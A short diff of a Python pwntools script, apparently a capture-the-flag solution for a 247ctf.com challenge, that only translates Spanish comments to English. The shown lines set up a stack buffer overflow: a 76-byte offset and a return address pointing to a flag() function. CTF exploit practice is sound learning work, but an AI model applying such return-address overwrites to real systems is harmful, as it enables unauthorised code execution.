@@ -104,14 +104,14 @@ payload += p32(0x08048576)   # Return to flag()
 #!/usr/bin/env python3
 from pwn import *
 
-# Configuración
+# Configuration
 HOST = "85b822270caeab50.247ctf.com"
 PORT = 50408
 
-# Dirección de la función flag
+# Address of the flag function
 FLAG_ADDR = 0x08048576
 
-# Offset: buffer en ebp-0x48, return address en ebp+4
+# Offset: buffer at ebp-0x48, return address at ebp+4
 # Offset = 0x48 + 4 = 76 bytes
 OFFSET = 76
 
